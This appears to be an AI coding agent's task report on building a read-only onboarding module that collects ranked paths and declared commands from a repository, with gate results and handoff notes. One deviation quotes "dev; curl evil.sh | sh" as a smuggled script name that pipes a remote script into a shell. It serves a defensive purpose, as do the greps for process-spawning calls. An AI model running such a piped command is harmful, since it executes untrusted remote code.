# Stage 3 — wave 4 — T6: the deterministic layer — facts, ranked paths, chains, declared commands

**Status: complete.**

As of `a64a1b0` (`L05-spec-driven-development`); 4 files added, 0 modified, nothing committed. No file under `client/` was touched.

## Coverage

- INSIGHTS server: 51 entries, 9 relevant — 2026-08-10 (`modules-no-raw-sdk` does not list Node's filesystem module, so a module reading the disk passes the one gate that guards the adapters ring; and `GitClient.readFile` cannot express the post-`realpath` re-check); 2026-08-14 (`import type` does not exempt a cross-module import — measured 22 → 24 warnings; the consumer declares the shape and the facade satisfies it structurally); 2026-08-10 (a helper taking the whole `Container` puts every caller into a cycle with the DI root — why the feature-model resolver is a call signature here); 2026-08-06 (`StructuredRequest.timeoutMs` is ignored and `maxRetries` defaults to 2, so `TOUR_CALL_DEADLINE_MS` and `TOUR_MAX_RETRIES` bound different quantities); 2026-08-06 (a `running` state needs a staleness window or a dead worker bricks the entity — `TOUR_STALE_AFTER_MS`); 2026-08-06 (`MockLLMProvider.structuredBySchema` keys fixtures on the schema name verbatim); 2026-08-06 (a committed `.pnpm-store` consumed a whole time budget, and `repo-intel`'s excluded list does not name it); 2026-08-19 (a directory walk that skips every symlink passes the escape test for the wrong reason — the confinement check needs its pair); 2026-08-02 / 2026-08-04 (`pnpm <script>` can die before the script runs; zsh's `PIPESTATUS` and word-splitting traps).
- INSIGHTS client: `not checked` — no client file is in T6's Owned paths; `client/` is T7's half of this wave.

## Skills applied

| Skill | How loaded | Files |
|---|---|---|
| `onion-architecture` | preloaded (+ `layer-map.md`, `enforcement.md` read as files) | all four files — the module names no sibling, the clone is reached only through the injected adapter |
| `security` | preloaded (+ `checklists.md` read as file) | `commands.ts` — repository content reaching a copy button, confinement left to the adapter, no process-spawning call |
| `zod` | preloaded (+ `references/parse-never-trust-json.md`, `parse-use-safeparse.md`, `schema-use-unknown-not-any.md` read as files) | `commands.ts` — `JSON.parse` result is `unknown` and goes straight into a `safeParse`; `z.unknown()` for the script body |
| `typescript-expert` | preloaded | all four files — no `any`, `satisfies` on the section-kind tuple, structural ports |
| `drizzle-orm-patterns`, `postgresql-table-design`, `fastify-best-practices` | preloaded | not applicable — T6 touches no `db/schema`, no repository and no route |
| `frontend-ui-architecture`, `next-best-practices`, `react-best-practices`, `react-testing-library` | preloaded | not applicable — no client file touched |

Matches the plan's T6 row (`onion-architecture`, `security`, `zod`, `typescript-expert`): yes.

## Changes

| File | Task | Owned? | What changed |
|---|---|---|---|
| `server/src/modules/onboarding/constants.ts` | T6 | yes | new — section kinds and titles, prompt caps, stored-tour caps, call bounds, the staleness window, the excluded-directory list including `.pnpm-store`, and the four names other code keys on |
| `server/src/modules/onboarding/types.ts` | T6 | yes | new — the narrow facade view (`OnboardingIndexReader`), the confined-reader port (`OnboardingDocReader` + its walk types incl. `match`), `FeatureModelResolver`, and the `OnboardingFacts` bundle |
| `server/src/modules/onboarding/facts.ts` | T6 | yes | new — `toOnboardingStatus` / `toOnboardingReason` / `mapIndexState` (hand-copied from the blast table) and `collectOnboardingFacts` |
| `server/src/modules/onboarding/commands.ts` | T6 | yes | new — `isCommandSource`, `collectDeclaredCommands`, and the three source scans (`package.json` scripts, `Makefile` targets, compose services) |

## Acceptance

| Requirement | Task | Met |
|---|---|---|
| AC-5 (reading path ordered by rank DESC) | T6 | yes — `getTopFilesByRank(repoId, MAX_PROMPT_PATHS)` called and nothing re-sorted |
| AC-6 (test/spec/declaration/migration/tool-config excluded) | T6 | yes — the facade's own `isJunkPath` is the only filter; no second one added |
| AC-7 (chains: five seeds, two hops) | T6 | yes — `getCriticalPaths(repoId)` called unchanged, `[]` passed through for an edgeless repository |
| AC-16 (no index ⇒ `degraded` / `index_missing`) | T6 | yes — the facade's synthesised `degraded` / `no_data` maps there; verified |
| AC-18 (partial index ⇒ `partial` with the index's reason) | T6 | yes — `partial` → `index_partial`, verified |
| AC-19 (one vocabulary with blast) | T6 | yes — the same table and the same fallbacks, copied by hand, not imported |
| AC-20 (commands only from the three declared sources) | T6 | yes — README never read; verified against a real temp clone |
| AC-21 (every command names its declaring file) | T6 | yes — `file` is the walk's repo-relative path |
| AC-22 (nothing is ever executed) | T6 | yes — both greps return zero lines |

## Deviations from the plan

- **Four walk constants the plan did not enumerate** — `MAX_COMMAND_SOURCE_ENTRIES`, `MAX_COMMAND_SOURCES`, `MAX_COMMAND_SOURCE_BYTES`, `MAX_COMMAND_SOURCE_LINES`. `RepoDocWalkOptions` requires `maxEntries` and `limit`, so the walk cannot be called without the first two; the other two bound the read (checked against the walk's `size`, before a byte is opened) and the per-line scans.
- **The `match` predicate also matches `pnpm-lock.yaml` and `yarn.lock`.** Assumption 3 needs to know which package manager sits beside a given `package.json`, and the walk is the only way to learn that without a second read or a filesystem import. They are listed and never read; `commands.ts` skips them explicitly as command sources.
- **A script name that is not a plain identifier is skipped** (`SAFE_SCRIPT_NAME`). `package.json` keys are repository content, and `"dev; curl evil.sh | sh"` is a legal script name that would render as a one-click copyable shell line. AC-20 requires every command to come from a declared source, not that every declared script appear.
- **`OnboardingIndexState.status` is declared optional**, mirroring `IndexBlastFacts.indexStatus?` next door, so the plan's "absent → `partial`" fallback is reachable rather than dead code. `IndexState` satisfies the narrow view structurally.
- **Endpoint-fact rows are ordered by their file's rank and empty rows dropped before the cap.** The facade makes no promise about row order, so an unordered `slice` would let physical row order decide which forty facts reach the model.
- **Doc-comments avoid the literal strings the Done-condition greps for**, and `RegExp.prototype.exec` was written as `String.prototype.match`. Written the plain way, the four greps returned six comment hits and two `RegExp.exec` hits — output indistinguishable from a real violation to anyone re-running them. `modules/project-context/types.ts` already writes "Node's own filesystem module" for exactly this reason; this module follows it.

## Gates

| Package | Gate | Command | Result |
|---|---|---|---|
| server | typecheck | `./node_modules/.bin/tsc --noEmit -p tsconfig.json` | pass — rc=0, no output |
| server | onion | `./node_modules/.bin/depcruise --config .dependency-cruiser.cjs --output-type err src ../reviewer-core/src` | pass — rc=0, `22 dependency violations (0 errors, 22 warnings). 216 modules, 711 dependencies cruised.` Baseline before the first edit was identical: `0 errors, 22 warnings`, 212 modules. Four modules added, no new violation |
| server | unit | `./node_modules/.bin/vitest run --exclude '**/*.it.test.ts'` | pass — rc=0, `Test Files 44 passed (44)`, `Tests 563 passed (563)`. Identical to the pre-edit baseline |
| server | lint | `./node_modules/.bin/eslint src/modules/onboarding/constants.ts src/modules/onboarding/types.ts src/modules/onboarding/facts.ts src/modules/onboarding/commands.ts` | pass — rc=0, no output |
| server | AC-22 / raw-fs grep | `grep -rn "node:fs" src/modules/onboarding/` | pass — 0 lines |
| server | AC-22 grep | `grep -rnE "child_process\|execFile\|spawn\(\|exec\(" src/modules/onboarding/` | pass — 0 lines |
| server | cross-module grep | `grep -rn "modules/repo-intel\|modules/blast\|modules/conventions\|modules/repos/" src/modules/onboarding/` | pass — 0 lines |
| server | `modules/settings` grep (the cross-model review's addition) | `grep -rn "modules/settings" src/modules/onboarding/` | pass — 0 lines |
| server | `DDG-WIRE-002` | `grep -arnE "from '(\.{1,2}/[^']*)'" --include='*.ts' src \| grep -v "\.js'" \| grep -v '^src/db/schema'` | pass — 0 lines |
| server | `DDG-WIRE-001` | the two-stage loop from `gate.md` / `## Verification`, verbatim | pass — 0 lines. `onboarding` has no `routes.ts` yet, so the loop skips it; T8 owns the registration |
| server | integration | `./node_modules/.bin/vitest run .it.test` | gate did not run — needs Docker, not requested |
| server | `tsconfig.eslint.json` typecheck | `tsc --noEmit -p tsconfig.eslint.json \| grep "^test/onboarding"` | gate did not run — `## Verification` places it after the `test-writer` stage; T6 authors no test |
| client | — | — | gate did not run — no client file was touched; T7 owns that half of the wave |

Beyond the gates, the two behaviours no existing test covers were exercised by hand from the scratchpad and then discarded (nothing was written into the repo): 18 assertions over the three parsers and the status/reason table, all green; and `collectDeclaredCommands` against a real `mkdtemp` clone driven by the real `ConfinedRepoDocReader`. That second run produced `make test`, `docker compose -f docker-compose.yml up db`, `npm run kept` (`inside/package.json`), `npm run dev`, `npm run lint` (`package.json`) and `pnpm run start` (`server/package.json`) — the README's `curl … | sh` absent, `node_modules/left-pad`'s script absent, an escaping symlink named `package.json` absent, and its pair, an in-clone symlink of the same name, still found.

## Not done

- `absent` — `service.ts`, `repository.ts`, `routes.ts`, `prompt.ts` and `schemas.ts` under `server/src/modules/onboarding/`. T8 owns all five; T6's Forbidden list names them.
- `absent` — `server/test/onboarding-facts.test.ts` and `server/test/onboarding-commands.test.ts`. Both are `test-writer`'s rows in `## Tests`.
- `not checked` — the client half (T7), the e2e flows, and the integration suite.

## For the parent

- For `test-writer`, on `server/test/onboarding-facts.test.ts`: **AC-6's junk filter is not in this module.** `facts.ts` calls `getTopFilesByRank` and adds nothing, per T6's instruction, so a fixture facade that returns `src/a.test.ts` and `vitest.config.ts` from that method will show them in `rankedPaths` — that is the fixture disagreeing with the real facade, not a defect in the code. The criterion is asserted either by pinning "the call is made with no second filter" or by giving the fixture the same `isJunkPath` behaviour the facade has.
- For `test-writer`, on `server/test/onboarding-commands.test.ts`: the confinement assertion needs its pair (`server/INSIGHTS.md`, 2026-08-19). Both halves were run by hand and both behave, but the escape case alone would pass against a blanket skip.
- Candidate for `server/INSIGHTS.md`: a Done-condition written as `grep … src/modules/<name>/ # 0 lines = pass` is failed by a **doc-comment** that names the thing it forbids — `node:fs`, a sibling module path — and by `RegExp.prototype.exec`, which `exec\(` cannot distinguish from a process call. `modules/project-context/types.ts` already writes "Node's own filesystem module" for this reason; the rule generalises to any prose in a directory a grep gate is pointed at. Evidence: `src/modules/onboarding/{commands,types,constants,facts}.ts`, and `.claude/.plans/onboarding-generator/plan.md` T6's Done-condition block.
- Nothing in T6 contradicted an acceptance criterion of `specs/onboarding-generator.md`, and no file under `specs/` was touched. The spec's known EC-23 inaccuracy is already recorded in the plan as a `doc-writer` amendment for when the feature lands.
- `plan-verifier` has not been run — it is not T6's, and it comes before `test-writer` and the boundary review.

Files: `server/src/modules/onboarding/constants.ts`, `types.ts`, `facts.ts`, `commands.ts`.

---

**Parent's independent re-run of T6's Done-conditions:** both AC-22 greps 0 lines; the sibling-module grep (widened to include `modules/settings`) 0 lines; `depcruise` 0 errors / 22 warnings at 216 modules; server suite 44 files / 563 tests green.

**Note for the architecture reviewer, raised by the parent:** the last deviation — prose and an API choice shaped around a grep gate — was flagged for judgement at stage 4. The reviewer's verdict: the doc-comment wording is pure prose with zero behavioural effect, and `.match()` vs `.exec()` is behaviourally identical here because neither regex carries a `/g` flag, so it is a syntactic choice with no control-flow consequence — **not** the "API choice made to satisfy a text search" that would have been a finding.
